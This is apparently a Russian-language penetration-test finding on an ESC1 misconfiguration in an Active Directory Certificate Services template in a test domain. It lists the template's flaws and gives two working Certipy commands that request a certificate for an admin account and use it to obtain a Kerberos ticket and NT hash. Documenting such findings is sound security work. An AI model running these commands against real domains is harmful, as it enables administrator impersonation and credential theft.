# Содержание
- [Содержание](#содержание)
- [Введение](#введение)
- [Технические данные](#технические-данные)
- [Эксплуатация](#эксплуатация)
# Введение
В ходе тестирования был получен доступ к AD CS от имени пользователя, состоящего в группе `Domain Users`. Далее, в ходе сбора данных о конфигурации AD CS был получен шаблон сертификата, безопасность которого будет рассмотрена дальше.
# Технические данные
Предоставленный сертификат подчиняется сценарию эскалации **ESC1** (**Escalation Scenario 1**) - атаке, при которой **злоумышленник** самостоятельно указывает имя владельца сертификата и таким образом **может пройти аутентификацию от имени любого пользователя, включая администратора**.

**В шаблоне сертификата присутствуют следующие ошибки**:
1) **Разрешено указывать Subject Alternative Name**
	```
	Enrollee Supplies Subject: True
	Certificate Name Flag: EnrolleeSuppliesSubject
	```
2) **Непривилегированный пользователь имеет право регистрации сертификатов**
	```
	 Permissions
	  Enrollment Permissions
	   Enrollment Rights: PENTEST.LOCAL\Authenticated Users
	```
3) **Не требуется одобрение менеджера**
	```
	Requires Manager Approval: False
	```
4) **Не нужны авторизованные подписи**
	```
	Authorized Signatures Required: 0
	```
5) **Опасные EKU**
   Шаблон позволяет использовать сертификат для аутентификации.
	```
	Extended Key Usage: Client Authentication
	```
# Эксплуатация
Для эксплуатации можно использовать определенные инструменты, например Certipy.
1) Запрос сертификата с поддельным `SAN` для УЗ `victim_adm@PENTEST.LOCAL` пользователем `hacker` :
	```powershell
	certipy req -u hacker -p <password> -target PENTEST.LOCAL -dc-ip <dc_ip> -ca Antique_CA -template ForClient -upn victim_adm@PENTEST.LOCAL
	```
	Если все успешно то злоумышленник получает файл сертификата и закрытый ключ, например `hacked.pfx`.
2) Аутентификация с полученным сертификатом `hacked.pfx` (например для Kerberos)
	```powershell
	certipy auth -pfx hacked.pfx -username victim_adm -domain PENTEST.LOCAL -dc-ip <dc_ip> -ptt
	```
	В результате злоумышленник получает TGT УЗ  `victim_adm`, Kerberos-билет в формате `.ccache` и NT-хеш пользователя.

`©🦬`